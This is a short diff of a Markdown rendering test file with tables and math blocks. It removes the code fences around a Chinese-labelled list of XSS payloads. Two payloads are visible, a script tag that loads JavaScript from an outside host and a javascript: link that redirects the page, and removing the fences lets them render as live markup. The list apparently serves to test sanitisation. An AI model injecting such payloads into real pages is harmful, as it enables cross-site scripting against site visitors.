@@ -13,7 +13,7 @@ Content in the first column | Content in the second column
 | col 2 is      | centered        |   $12 |
 
 
-```
+
 (1)普通的XSS JavaScript注入
 
 <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
@@ -207,7 +207,7 @@ tt p://6 6.000146.0×7.147/"">XSS</A>
 (77)javascript链接
 
 <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
-```
+
 
 ## Mathematical formula `$y = x^2$`
 
@@ -230,4 +230,4 @@ Math block:
  \frac{\sin(\kappa R)}{\kappa R}
  \frac{\partial}{\partial R}
  \left[R^2\frac{\partial D_n(R)}{\partial R}\right]\,dR
-```
+````
